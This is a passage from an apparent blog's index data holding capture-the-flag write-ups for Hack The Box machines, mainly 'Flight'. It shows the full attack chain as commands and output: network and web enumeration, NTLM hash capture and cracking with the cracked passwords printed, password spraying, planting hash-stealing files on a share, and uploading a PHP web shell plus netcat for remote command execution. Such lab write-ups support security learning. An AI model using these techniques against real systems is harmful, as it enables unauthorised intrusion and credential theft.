click Next again Now we have an access to password manager Switch to root and get flag ","date":"September 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bolt/images/bolt.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bolt/","summary":"Bolt Enumeration nmap └─$ nmap -Pn -p- 10.10.11.114 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 11:56 BST Nmap scan report for 10.10.11.114 (10.10.11.114) Host is up (0.17s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 723.12 seconds └─$ nmap -Pn -p22,80,443 -sC -sV 10.10.11.114 -T4 Starting Nmap 7.","tags":["HTB","vhosts","docker","docker-tar","roundcube","webmail","passbolt","dive","sqlite","hashcat","source-code","ssti","payloadsallthethings","chrome","john","python"],"title":"[HTB] Machine: Bolt"},{"categories":null,"contents":"Flight Enumeration nmap └─$ nmap -Pn -p- 10.10.11.187 -T4 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-20 19:23 BST Nmap scan report for 10.10.11.187 (10.10.11.187) Host is up (0.099s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49668/tcp open unknown 49675/tcp open unknown 49676/tcp open unknown 49696/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 43.28 seconds └─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.11.187 -T4 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-20 19:26 BST Nmap scan report for 10.10.11.187 (10.10.11.187) Host is up (0.13s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 |_http-title: g0 Aviation 88/tcp filtered kerberos-sec 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp filtered kpasswd5 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-09-21T01:26:00 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: 6h59m19s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 56.48 seconds Web server vhosts └─$ wfuzz -u http://flight.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#34;Host: FUZZ.flight.htb\u0026#34; --hh 7069 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://flight.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000624: 200 90 L 412 W 3996 Ch \u0026#34;school\u0026#34; gobuster feroxbuster -u http://flight.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k └─$ gobuster dir -u http://flight.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://flight.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/09/21 17:49:03 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 333] [--\u0026gt; http://flight.htb/images/] /Images (Status: 301) [Size: 333] [--\u0026gt; http://flight.htb/Images/] /css (Status: 301) [Size: 330] [--\u0026gt; http://flight.htb/css/] /js (Status: 301) [Size: 329] [--\u0026gt; http://flight.htb/js/] /examples (Status: 503) [Size: 399] /licenses (Status: 403) [Size: 418] /IMAGES (Status: 301) [Size: 333] [--\u0026gt; http://flight.htb/IMAGES/] /%20 (Status: 403) [Size: 299] /*checkout*.php (Status: 403) [Size: 299] /*checkout* (Status: 403) [Size: 299] /*checkout*.txt (Status: 403) [Size: 299] /CSS (Status: 301) [Size: 330] [--\u0026gt; http://flight.htb/CSS/] /JS (Status: 301) [Size: 329] [--\u0026gt; http://flight.htb/JS/] /phpmyadmin (Status: 403) [Size: 418] /webalizer (Status: 403) [Size: 418] /*docroot*.php (Status: 403) [Size: 299] /*docroot* (Status: 403) [Size: 299] /*docroot*.txt (Status: 403) [Size: 299] /*.txt (Status: 403) [Size: 299] /* (Status: 403) [Size: 299] /*.php (Status: 403) [Size: 299] /con (Status: 403) [Size: 299] /con.txt (Status: 403) [Size: 299] /con.php (Status: 403) [Size: 299] └─$ gobuster dir -u http://school.flight.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://school.flight.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/09/21 17:53:03 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 3996] /images (Status: 301) [Size: 347] [--\u0026gt; http://school.flight.htb/images/] /Images (Status: 301) [Size: 347] [--\u0026gt; http://school.flight.htb/Images/] /Index.php (Status: 200) [Size: 3996] /examples (Status: 503) [Size: 406] /styles (Status: 301) [Size: 347] [--\u0026gt; http://school.flight.htb/styles/] /licenses (Status: 403) [Size: 425] /IMAGES (Status: 301) [Size: 347] [--\u0026gt; http://school.flight.htb/IMAGES/] /%20 (Status: 403) [Size: 306] /INDEX.php (Status: 200) [Size: 3996] /*checkout*.txt (Status: 403) [Size: 306] /*checkout* (Status: 403) [Size: 306] /*checkout*.php (Status: 403) [Size: 306] /phpmyadmin (Status: 403) [Size: 425] /webalizer (Status: 403) [Size: 425] /Styles (Status: 301) [Size: 347] [--\u0026gt; http://school.flight.htb/Styles/] /*docroot*.php (Status: 403) [Size: 306] /*docroot*.txt (Status: 403) [Size: 306] /*docroot* (Status: 403) [Size: 306] /* (Status: 403) [Size: 306] /*.txt (Status: 403) [Size: 306] /*.php (Status: 403) [Size: 306] /con.txt (Status: 403) [Size: 306] /con (Status: 403) [Size: 306] /con.php (Status: 403) [Size: 306] /http%3A (Status: 403) [Size: 306] /http%3A.txt (Status: 403) [Size: 306] /http%3A.php (Status: 403) [Size: 306] /**http%3a.txt (Status: 403) [Size: 306] /**http%3a (Status: 403) [Size: 306] /**http%3a.php (Status: 403) [Size: 306] /*http%3A.txt (Status: 403) [Size: 306] /*http%3A.php (Status: 403) [Size: 306] /*http%3A (Status: 403) [Size: 306] /aux (Status: 403) [Size: 306] /aux.txt (Status: 403) [Size: 306] /aux.php (Status: 403) [Size: 306] /**http%3A.php (Status: 403) [Size: 306] /**http%3A (Status: 403) [Size: 306] /**http%3A.txt (Status: 403) [Size: 306] /%C0 (Status: 403) [Size: 306] /%C0.txt (Status: 403) [Size: 306] /%C0.php (Status: 403) [Size: 306] smb └─$ smbclient -N -L //flight.htb Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to flight.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available school.flight.htb Foothold We have a potential lfi with view parameter But we our request gets blocked If we change \\ to / we bypass the block We can test for rfi But php is not processed Let\u0026rsquo;s launch responder and try to intercept the hash Let\u0026rsquo;s try cracking the hash svc_apache:S@Ss!K@*t13 └─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU ... SVC_APACHE::flight:a1d802983cf1295e:2a5deb80aa9f3ef5d2d33830ba6bb149:0101000000000000808d2fad41eed901322fa9f8baad618c0000000002000800460035005700460001001e00570049004e002d004400450045004b0044004b003100560056004c00350004003400570049004e002d004400450045004b0044004b003100560056004c0035002e0046003500570046002e004c004f00430041004c000300140046003500570046002e004c004f00430041004c000500140046003500570046002e004c004f00430041004c0007000800808d2fad41eed90106000400020000000800300030000000000000000000000000300000ea6b7f0aaf37ef71cd4e465811c76d335a8573866f11c7ffe603a95f9f5a2dc00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0039000000000000000000:S@Ss!K@*t13 Session..........: hashcat Status...........: Cracked Hash.Mode........: 5600 (NetNTLMv2) Hash.Target......: SVC_APACHE::flight:a1d802983cf1295e:2a5deb80aa9f3ef...000000 Time.Started.....: Sat Sep 23 17:18:11 2023 (9 secs) Time.Estimated...: Sat Sep 23 17:18:20 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1190.1 kH/s (0.37ms) @ Accel:256 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 10663424/14344385 (74.34%) Rejected.........: 0/10663424 (0.00%) Restore.Point....: 10662912/14344385 (74.34%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: S@ltw@ter -\u0026gt; S8tr4Love Hardware.Mon.#1..: Util: 91% Started: Sat Sep 23 17:18:11 2023 Stopped: Sat Sep 23 17:18:22 2023 The creds work for smb └─$ crackmapexec smb 10.10.11.187 -u svc_apache -p \u0026#39;S@Ss!K@*t13\u0026#39; SMB 10.10.11.187 445 G0 [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) SMB 10.10.11.187 445 G0 [+] flight.htb\\svc_apache:S@Ss!K@*t13 └─$ smbmap -H 10.10.11.187 -u svc_apache -p \u0026#39;S@Ss!K@*t13\u0026#39; [+] IP: 10.10.11.187:445 Name: flight.htb Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share Shared READ ONLY SYSVOL READ ONLY Logon server share Users READ ONLY Web READ ONLY User #1 smb Nothing interesting in users └─$ smbmap -H 10.10.11.187 -u svc_apache -p \u0026#39;S@Ss!K@*t13\u0026#39; -R users [+] IP: 10.10.11.187:445 Name: flight.htb Disk Permissions Comment ---- ----------- ------- users READ ONLY .\\users\\* dw--w--w-- 0 Thu Sep 22 21:16:56 2022 . dw--w--w-- 0 Thu Sep 22 21:16:56 2022 .. dr--r--r-- 0 Thu Sep 22 20:28:03 2022 .NET v4.5 dr--r--r-- 0 Thu Sep 22 20:28:02 2022 .NET v4.5 Classic dr--r--r-- 0 Mon Oct 31 18:34:00 2022 Administrator dr--r--r-- 0 Tue Jul 20 21:19:19 2021 All Users dr--r--r-- 0 Thu Sep 22 21:08:23 2022 C.Bum dw--w--w-- 0 Tue Jul 20 20:20:24 2021 Default dr--r--r-- 0 Tue Jul 20 21:19:19 2021 Default User fr--r--r-- 174 Tue Jul 20 21:17:23 2021 desktop.ini dw--w--w-- 0 Tue Jul 20 20:23:25 2021 Public dr--r--r-- 0 Fri Oct 21 19:50:21 2022 svc_apache ... Nothing on Shared └─$ smbmap -H 10.10.11.187 -u svc_apache -p \u0026#39;S@Ss!K@*t13\u0026#39; -R Shared [+] IP: 10.10.11.187:445 Name: flight.htb Disk Permissions Comment ---- ----------- ------- Shared READ ONLY .\\Shared\\* dr--r--r-- 0 Fri Oct 28 21:21:28 2022 . dr--r--r-- 0 Fri Oct 28 21:21:28 2022 .. Nothing on Web └─$ smbmap -H 10.10.11.187 -u svc_apache -p \u0026#39;S@Ss!K@*t13\u0026#39; -R Web [+] IP: 10.10.11.187:445 Name: flight.htb Disk Permissions Comment ---- ----------- ------- Web READ ONLY .\\Web\\* dr--r--r-- 0 Sun Sep 24 01:17:00 2023 . dr--r--r-- 0 Sun Sep 24 01:17:00 2023 .. dr--r--r-- 0 Sun Sep 24 01:17:00 2023 flight.htb dr--r--r-- 0 Sun Sep 24 01:17:00 2023 school.flight.htb .\\Web\\flight.htb\\* Let\u0026rsquo;s get users rpcclient impacket-lookupsid or crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' -d flight.htb --users └─$ rpcclient -U \u0026#39;svc_apache\u0026#39; -N flight.htb --password=\u0026#39;S@Ss!K@*t13\u0026#39; rpcclient $\u0026gt; querydispinfo index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator Name: (null) Desc: Built-in account for administering the computer/domain index: 0xfb5 RID: 0x647 acb: 0x00000210 Account: C.Bum Name: (null) Desc: Senior Web Developer index: 0xfb8 RID: 0x64a acb: 0x00000210 Account: D.Truff Name: (null) Desc: Project Manager index: 0xfb2 RID: 0x644 acb: 0x00000210 Account: G.Lors Name: (null) Desc: Sales manager index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null) Desc: Built-in account for guest access to the computer/domain index: 0xfb7 RID: 0x649 acb: 0x00000210 Account: I.Francis Name: (null) Desc: Nobody knows why he\u0026#39;s here index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null) Desc: Key Distribution Center Service Account index: 0xfb3 RID: 0x645 acb: 0x00000210 Account: L.Kein Name: (null) Desc: Penetration tester index: 0xfb4 RID: 0x646 acb: 0x00000210 Account: M.Gold Name: (null) Desc: Sysadmin index: 0xfbb RID: 0x64d acb: 0x00000210 Account: O.Possum Name: (null) Desc: Helpdesk index: 0xfb1 RID: 0x643 acb: 0x00000210 Account: R.Cold Name: (null) Desc: HR Assistant index: 0xfb0 RID: 0x642 acb: 0x00000210 Account: S.Moon Name: (null) Desc: Junion Web Developer index: 0xfba RID: 0x64c acb: 0x00000210 Account: svc_apache Name: (null) Desc: Service Apache web index: 0xfb9 RID: 0x64b acb: 0x00000210 Account: V.Stevens Name: (null) Desc: Secretary index: 0xfb6 RID: 0x648 acb: 0x00000210 Account: W.Walker Name: (null) Desc: Payroll officer rpcclient $\u0026gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[S.Moon] rid:[0x642] user:[R.Cold] rid:[0x643] user:[G.Lors] rid:[0x644] user:[L.Kein] rid:[0x645] user:[M.Gold] rid:[0x646] user:[C.Bum] rid:[0x647] user:[W.Walker] rid:[0x648] user:[I.Francis] rid:[0x649] user:[D.Truff] rid:[0x64a] user:[V.Stevens] rid:[0x64b] user:[svc_apache] rid:[0x64c] user:[O.Possum] rid:[0x64d] └─$ impacket-lookupsid flight.htb/svc_apache:\u0026#39;S@Ss!K@*t13\u0026#39;@flight.htb Impacket v0.11.0 - Copyright 2023 Fortra [*] Brute forcing SIDs at flight.htb [*] StringBinding ncacn_np:flight.htb[\\pipe\\lsarpc] [*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209 498: flight\\Enterprise Read-only Domain Controllers (SidTypeGroup) 500: flight\\Administrator (SidTypeUser) 501: flight\\Guest (SidTypeUser) 502: flight\\krbtgt (SidTypeUser) 512: flight\\Domain Admins (SidTypeGroup) 513: flight\\Domain Users (SidTypeGroup) 514: flight\\Domain Guests (SidTypeGroup) 515: flight\\Domain Computers (SidTypeGroup) 516: flight\\Domain Controllers (SidTypeGroup) 517: flight\\Cert Publishers (SidTypeAlias) 518: flight\\Schema Admins (SidTypeGroup) 519: flight\\Enterprise Admins (SidTypeGroup) 520: flight\\Group Policy Creator Owners (SidTypeGroup) 521: flight\\Read-only Domain Controllers (SidTypeGroup) 522: flight\\Cloneable Domain Controllers (SidTypeGroup) 525: flight\\Protected Users (SidTypeGroup) 526: flight\\Key Admins (SidTypeGroup) 527: flight\\Enterprise Key Admins (SidTypeGroup) 553: flight\\RAS and IAS Servers (SidTypeAlias) 571: flight\\Allowed RODC Password Replication Group (SidTypeAlias) 572: flight\\Denied RODC Password Replication Group (SidTypeAlias) 1000: flight\\Access-Denied Assistance Users (SidTypeAlias) 1001: flight\\G0$ (SidTypeUser) 1102: flight\\DnsAdmins (SidTypeAlias) 1103: flight\\DnsUpdateProxy (SidTypeGroup) 1602: flight\\S.Moon (SidTypeUser) 1603: flight\\R.Cold (SidTypeUser) 1604: flight\\G.Lors (SidTypeUser) 1605: flight\\L.Kein (SidTypeUser) 1606: flight\\M.Gold (SidTypeUser) 1607: flight\\C.Bum (SidTypeUser) 1608: flight\\W.Walker (SidTypeUser) 1609: flight\\I.Francis (SidTypeUser) 1610: flight\\D.Truff (SidTypeUser) 1611: flight\\V.Stevens (SidTypeUser) 1612: flight\\svc_apache (SidTypeUser) 1613: flight\\O.Possum (SidTypeUser) 1614: flight\\WebDevs (SidTypeGroup) Let\u0026rsquo;s try password spraying └─$ crackmapexec smb 10.10.11.187 -u user.list -p \u0026#39;S@Ss!K@*t13\u0026#39; --continue-on-success SMB 10.10.11.187 445 G0 [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) SMB 10.10.11.187 445 G0 [-] flight.htb\\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB 10.10.11.187 445 G0 [-] flight.htb\\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB 10.10.11.187 445 G0 [-] flight.htb\\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB 10.10.11.187 445 G0 [-] flight.htb\\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB 10.10.11.187 445 G0 [-] flight.htb\\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB 10.10.11.187 445 G0 [-] flight.htb\\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB 10.10.11.187 445 G0 [-] flight.htb\\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB 10.10.11.187 445 G0 [-] flight.htb\\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB 10.10.11.187 445 G0 [-] flight.htb\\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB 10.10.11.187 445 G0 [+] flight.htb\\S.Moon:S@Ss!K@*t13 SMB 10.10.11.187 445 G0 [+] flight.htb\\svc_apache:S@Ss!K@*t13 SMB 10.10.11.187 445 G0 [-] flight.htb\\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB 10.10.11.187 445 G0 [-] flight.htb\\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE User #2 smb Now we have Write privileges over Shared directory We can drop the files to steal users hash in case someone visits the share https://github.com/Greenwolf/ntlm_theft └─$ smbmap -H 10.10.11.187 -u \u0026#39;S.Moon\u0026#39; -p \u0026#39;S@Ss!K@*t13\u0026#39; [+] IP: 10.10.11.187:445 Name: flight.htb Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share Shared READ, WRITE SYSVOL READ ONLY Logon server share Users READ ONLY Web READ ONLY Let\u0026rsquo;s generate files └─$ python3 ntlm_theft.py -g all -f 0x13 -s 10.10.16.9 Created: 0x13/0x13.scf (BROWSE TO FOLDER) Created: 0x13/0x13-(url).url (BROWSE TO FOLDER) Created: 0x13/0x13-(icon).url (BROWSE TO FOLDER) Created: 0x13/0x13.lnk (BROWSE TO FOLDER) Created: 0x13/0x13.rtf (OPEN) Created: 0x13/0x13-(stylesheet).xml (OPEN) Created: 0x13/0x13-(fulldocx).xml (OPEN) Created: 0x13/0x13.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE) Created: 0x13/0x13-(includepicture).docx (OPEN) Created: 0x13/0x13-(remotetemplate).docx (OPEN) Created: 0x13/0x13-(frameset).docx (OPEN) Created: 0x13/0x13-(externalcell).xlsx (OPEN) Created: 0x13/0x13.wax (OPEN) Created: 0x13/0x13.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY) Created: 0x13/0x13.asx (OPEN) Created: 0x13/0x13.jnlp (OPEN) Created: 0x13/0x13.application (DOWNLOAD AND OPEN) Created: 0x13/0x13.pdf (OPEN AND ALLOW) Created: 0x13/zoom-attack-instructions.txt (PASTE TO CHAT) Created: 0x13/Autorun.inf (BROWSE TO FOLDER) Created: 0x13/desktop.ini (BROWSE TO FOLDER) Generation Complete. Now we need to drop them to Shared Bunch of them got blocked I set up responder before uploading the files └─$ smbclient //flight.htb/shared -U \u0026#39;S.Moon%S@Ss!K@*t13\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; prompt smb: \\\u0026gt; mput * NT_STATUS_ACCESS_DENIED opening remote file \\0x13.wax putting file 0x13.application as \\0x13.application (3.7 kb/s) (average 3.7 kb/s) NT_STATUS_ACCESS_DENIED opening remote file \\0x13-(url).url NT_STATUS_ACCESS_DENIED opening remote file \\0x13.scf putting file 0x13-(stylesheet).xml as \\0x13-(stylesheet).xml (0.5 kb/s) (average 2.4 kb/s) NT_STATUS_ACCESS_DENIED opening remote file \\0x13-(externalcell).xlsx putting file 0x13-(fulldocx).xml as \\0x13-(fulldocx).xml (85.2 kb/s) (average 46.5 kb/s) putting file 0x13.jnlp as \\0x13.jnlp (0.6 kb/s) (average 39.0 kb/s) NT_STATUS_ACCESS_DENIED opening remote file \\0x13.asx NT_STATUS_ACCESS_DENIED opening remote file \\0x13-(remotetemplate).docx NT_STATUS_ACCESS_DENIED opening remote file \\0x13.lnk NT_STATUS_ACCESS_DENIED opening remote file \\0x13-(includepicture).docx NT_STATUS_ACCESS_DENIED opening remote file \\0x13.htm NT_STATUS_ACCESS_DENIED opening remote file \\0x13.rtf NT_STATUS_ACCESS_DENIED opening remote file \\Autorun.inf putting file desktop.ini as \\desktop.ini (0.2 kb/s) (average 33.7 kb/s) NT_STATUS_ACCESS_DENIED opening remote file \\0x13.pdf NT_STATUS_ACCESS_DENIED opening remote file \\0x13-(icon).url NT_STATUS_ACCESS_DENIED opening remote file \\zoom-attack-instructions.txt NT_STATUS_ACCESS_DENIED opening remote file \\0x13-(frameset).docx NT_STATUS_ACCESS_DENIED opening remote file \\0x13.m3u smb: \\\u0026gt; ls . D 0 Sun Sep 24 01:46:32 2023 .. D 0 Sun Sep 24 01:46:32 2023 0x13-(fulldocx).xml A 72584 Sun Sep 24 01:46:30 2023 0x13-(stylesheet).xml A 162 Sun Sep 24 01:46:29 2023 0x13.application A 1649 Sun Sep 24 01:46:29 2023 0x13.jnlp A 191 Sun Sep 24 01:46:31 2023 desktop.ini A 46 Sun Sep 24 01:46:32 2023 5056511 blocks of size 4096. 1253131 blocks available And we got a hit Let\u0026rsquo;s crack it C.BUM:Tikkycoll_431012284 └─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU ... C.BUM::flight.htb:1c5bf6cf237e6004:b50e69477037ffe491d342e031104008:0101000000000000809cca644eeed901ae8f84612504481a0000000002000800310055004300450001001e00570049004e002d004900320042005a0046004c004f00380047005600390004003400570049004e002d004900320042005a0046004c004f0038004700560039002e0031005500430045002e004c004f00430041004c000300140031005500430045002e004c004f00430041004c000500140031005500430045002e004c004f00430041004c0007000800809cca644eeed90106000400020000000800300030000000000000000000000000300000ea6b7f0aaf37ef71cd4e465811c76d335a8573866f11c7ffe603a95f9f5a2dc00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0039000000000000000000:Tikkycoll_431012284 Session..........: hashcat Status...........: Cracked Hash.Mode........: 5600 (NetNTLMv2) Hash.Target......: C.BUM::flight.htb:1c5bf6cf237e6004:b50e69477037ffe4...000000 Time.Started.....: Sat Sep 23 18:49:23 2023 (9 secs) Time.Estimated...: Sat Sep 23 18:49:32 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1167.7 kH/s (0.37ms) @ Accel:256 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 10536448/14344385 (73.45%) Rejected.........: 0/10536448 (0.00%) Restore.Point....: 10535936/14344385 (73.45%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: Time14250 -\u0026gt; Tiggerkr Hardware.Mon.#1..: Util: 94% Started: Sat Sep 23 18:49:22 2023 Stopped: Sat Sep 23 18:49:34 2023 Let\u0026rsquo;s check the smb again └─$ smbmap -H 10.10.11.187 -u \u0026#39;c.bum\u0026#39; -p \u0026#39;Tikkycoll_431012284\u0026#39; [+] IP: 10.10.11.187:445 Name: flight.htb Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share Shared READ, WRITE SYSVOL READ ONLY Logon server share Users READ ONLY Web READ, WRITE We have Write permissions over Web directory Now we can try uploading a webshell and get reverse shell I uploaded the web shell to root directory of school.flight.htb but it got deleted So I uploaded the files to styles, it worked └─$ smbclient //flight.htb/Web -U \u0026#39;c.bum%Tikkycoll_431012284\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; cd school.flight.htb\\ smb: \\school.flight.htb\\\u0026gt; ls . D 0 Sun Sep 24 01:52:00 2023 .. D 0 Sun Sep 24 01:52:00 2023 about.html A 1689 Tue Oct 25 04:54:45 2022 blog.html A 3618 Tue Oct 25 04:53:59 2022 home.html A 2683 Tue Oct 25 04:56:58 2022 images D 0 Sun Sep 24 01:52:00 2023 index.php A 2092 Thu Oct 27 08:59:25 2022 lfi.html A 179 Thu Oct 27 08:55:16 2022 styles D 0 Sun Sep 24 01:52:00 2023 5056511 blocks of size 4096. 1253232 blocks available smb: \\school.flight.htb\\\u0026gt; put shell.php putting file shell.php as \\school.flight.htb\\shell.php (0.1 kb/s) (average 0.1 kb/s) smb: \\school.flight.htb\\\u0026gt; put nc64.exe nc.exe putting file nc64.exe as \\school.flight.htb\\nc.exe (59.7 kb/s) (average 42.6 kb/s) smb: \\school.flight.htb\\\u0026gt; ls . D 0 Sun Sep 24 01:57:00 2023 .. D 0 Sun Sep 24 01:57:00 2023 about.html A 1689 Tue Oct 25 04:54:45 2022 blog.html A 3618 Tue Oct 25 04:53:59 2022 home.html A 2683 Tue Oct 25 04:56:58 2022 images D 0 Sun Sep 24 01:57:00 2023 index.php A 2092 Thu Oct 27 08:59:25 2022 lfi.html A 179 Thu Oct 27 08:55:16 2022 styles D 0 Sun Sep 24 01:57:00 2023 5056511 blocks of size 4096. 1253232 blocks available smb: \\school.flight.htb\\\u0026gt; cd styles smb: \\school.flight.htb\\styles\\\u0026gt; put shell.php putting file shell.php as \\school.flight.htb\\styles\\shell.php (0.1 kb/s) (average 29.2 kb/s) smb: \\school.flight.htb\\styles\\\u0026gt; put nc64.exe nc.exe putting file nc64.exe as \\school.flight.htb\\styles\\nc.exe (46.6 kb/s) (average 35.9 kb/s) smb: \\school.flight.htb\\styles\\\u0026gt; ls . D 0 Sun Sep 24 01:58:04 2023 .. D 0 Sun Sep 24 01:58:04 2023 ie6.css A 587 Fri Dec 2 19:42:00 2011 nc.exe A 45272 Sun Sep 24 01:58:05 2023 shell.php A 35 Sun Sep 24 01:58:02 2023 style.css A 11045 Wed Jan 25 20:17:32 2012 5056511 blocks of size 4096. 1253220 blocks available We got rce └─$ curl \u0026#39;http://school.flight.htb/styles/shell.php?cmd=whoami\u0026#39; flight\\svc_apache 